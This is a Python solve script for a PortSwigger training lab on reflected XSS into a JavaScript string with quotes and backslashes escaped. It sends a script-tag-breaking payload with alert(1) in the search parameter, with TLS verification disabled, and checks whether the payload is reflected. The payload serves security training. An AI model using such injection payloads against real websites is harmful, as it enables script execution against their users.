#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
Closes the <script> tag and injects a new one since quotes/backslash are escaped but <> are not.
"""

import argparse
import requests
import urllib3
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(
        description="Solve XSS Lab 18: JS string with single quote and backslash escaped"
    )
    parser.add_argument("lab_url", help="Lab URL (e.g. https://0aXX00...web-security-academy.net)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    # Step 1: Build the exploit URL
    payload = "</script><script>alert(1)</script>"
    exploit_url = f"{lab}/?search={quote(payload)}"
    print(f"[+] Exploit URL:\n    {exploit_url}")

    # Step 2: Verify payload is reflected
    r = s.get(exploit_url)
    if "</script><script>alert(1)</script>" in r.text:
        print("[+] Payload reflected — <> not encoded")
    else:
        print("[-] Payload not found or angle brackets encoded")

    # Step 3: Check if lab is solved
    r = s.get(lab)
    if "Congratulations" in r.text:
        print("[+] Lab solved!")
    else:
        print("[*] Open the exploit URL in a browser to trigger alert(1)")


if __name__ == "__main__":
    main()
